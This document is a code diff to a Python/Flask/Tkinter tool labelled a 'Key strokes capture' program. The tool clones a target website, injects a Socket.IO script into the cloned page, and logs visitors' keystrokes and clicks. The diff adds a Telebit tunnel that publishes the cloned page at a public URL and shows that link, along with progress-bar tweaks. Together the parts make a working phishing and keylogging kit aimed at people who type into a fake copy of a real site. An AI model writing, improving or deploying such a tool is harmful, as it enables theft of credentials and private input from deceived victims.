@@ -8,9 +8,10 @@ from tkinter import scrolledtext
 from tkinter import filedialog
 from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
-import paramiko
 import time
 import tkinter.font as tkFont
+import subprocess
+import json
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -25,7 +26,6 @@ def clone_website(url):
     response = requests.get(url)
     if response.status_code == 200:
         cloned_html = response.text
-        # Inject event tracking script into the cloned HTML
         tracking_script = """
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
         <script>
@@ -60,7 +60,7 @@ def handle_keystroke(data):
     status_text.config(state=tk.NORMAL)
     status_text.insert(tk.END, f"[ + ] KEY STROKES CAPTURED: {data}\n")
     status_text.config(state=tk.DISABLED)
-    status_text.see(tk.END)  # Scroll to the end to show the latest keystroke
+    status_text.see(tk.END)
 
 @socketio.on('click')
 def handle_click(data):
@@ -78,15 +78,27 @@ def start_server(url):
     socketio.run(app, host='0.0.0.0', port=5000)
 
 def port_forward():
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect('your.remote.server', username='yourusername', password='yourpassword')
-    stdin, stdout, stderr = ssh.exec_command('command to port forward')
-    print(stdout.read().decode())
-    ssh.close()
+    # Start Telebit tunnel
+    telebit_process = subprocess.Popen(['telebit', 'http', '5000'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(2)  # Give Telebit time to initialize
+
+    # Get the public URL
+    telebit_url = None
+    for line in telebit_process.stdout:
+        if b"Forwarding" in line:
+            url = line.decode('utf-8').strip()
+            telebit_url = url.split("Forwarding")[1].strip()
+            break
+
+    if telebit_url:
+        port_forward_link.config(state=tk.NORMAL)
+        port_forward_link.delete(0, tk.END)
+        port_forward_link.insert(0, telebit_url)
+        port_forward_link.config(state='readonly')
+    else:
+        print("Failed to retrieve Telebit URL")
 
 def save_keylog():
-    # Open file dialog to choose where to save the keylog file
     file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
     if file_path:
         with open(file_path, "w") as f:
@@ -104,7 +116,6 @@ def on_start_keylogger():
     threading.Thread(target=start_server, args=(url,)).start()
     text_animation()
 
-# New text animation and progress update function
 def text_animation():
     steps = [
         "PLEASE WAIT ...",
@@ -125,25 +136,25 @@ def text_animation():
             alpha = fade / fade_steps
             fade_color = f'#{int(255 * (1 - alpha)):02x}{int(255 * (1 - alpha)):02x}{int(255 * (1 - alpha)):02x}'
             step_label.config(text=step, fg=fade_color)
-            progress_bar['value'] = int((i + (fade / fade_steps)) * progress_increment)
+            progress_bar['value'] = min(int((i + (fade / fade_steps)) * progress_increment), 100)
+            progress_percentage.set(f"{min(int((i + (fade / fade_steps)) * progress_increment), 100)}%")
             root.update_idletasks()
             time.sleep(step_delay / fade_steps)
-        time.sleep(step_delay)  # Simulating processing time
+        time.sleep(step_delay)
 
-    # Open the browser after the animation is complete
+    progress_bar['value'] = 100
+    progress_percentage.set("100%")
     open_browser()
 
-# GUI Setup
 # GUI Setup
 root = tk.Tk()
 root.title("$Avsus Key strokes capture")
 
-main_frame = ttk.Frame(root, padding="10 10 10 10")  # Adjust the padding to extend the progress bar
+main_frame = ttk.Frame(root, padding="10 10 10 10")
 main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
 
 font = tkFont.Font(family="Play", size=12)
 
-# Text with normal "may" and Play, sans-serif font
 note_text = tk.Label(main_frame, text="THIS TOOL *MAY* NOT WORK WITH COMPLEX WEBSITE THANKYOU :-) STILL TRYING TO FIX IT.")
 note_text.configure(font=font)
 note_text.grid(row=5, column=0, columnspan=3, pady=10, sticky=tk.W)
@@ -156,9 +167,13 @@ url_entry.grid(row=0, column=1, sticky=(tk.W, tk.E))
 start_button = ttk.Button(main_frame, text="Start Key Logger", command=on_start_keylogger, style="Custom.TButton")
 start_button.grid(row=0, column=2, sticky=tk.E)
 
-# Increase the length of the progress bar
 progress_bar = ttk.Progressbar(main_frame, orient="horizontal", length=700, mode="determinate")
 progress_bar.grid(row=1, column=0, columnspan=3, pady=20, ipady=5)
+
+progress_percentage = tk.StringVar()
+progress_percentage.set("0%")
+progress_label = ttk.Label(main_frame, textvariable=progress_percentage, font=font)
+progress_label.grid(row=1, column=3, padx=10)
 
 step_label = tk.Label(main_frame, text="", font=font)
 step_label.grid(row=2, column=0, columnspan=3, pady=10)
@@ -169,10 +184,12 @@ status_text.grid(row=3, column=0, columnspan=3)
 port_forward_button = ttk.Button(main_frame, text="Port Forwarding", command=port_forward, style="Custom.TButton")
 port_forward_button.grid(row=4, column=0, pady=10)
 
-save_keylog_button = ttk.Button(main_frame, text="Save Keylog", command=save_keylog, style="Custom.TButton")
-save_keylog_button.grid(row=4, column=1, pady=10)
+port_forward_link = ttk.Entry(main_frame, state=tk.DISABLED, font=font)
+port_forward_link.grid(row=4, column=1, pady=10, sticky=(tk.W, tk.E))
 
-# Define custom style for buttons
+save_keylog_button = ttk.Button(main_frame, text="Save Keylog", command=save_keylog, style="Custom.TButton")
+save_keylog_button.grid(row=4, column=2, pady=10)
+
 style = ttk.Style()
 style.configure("Custom.TButton", font=("Play", 12))
 
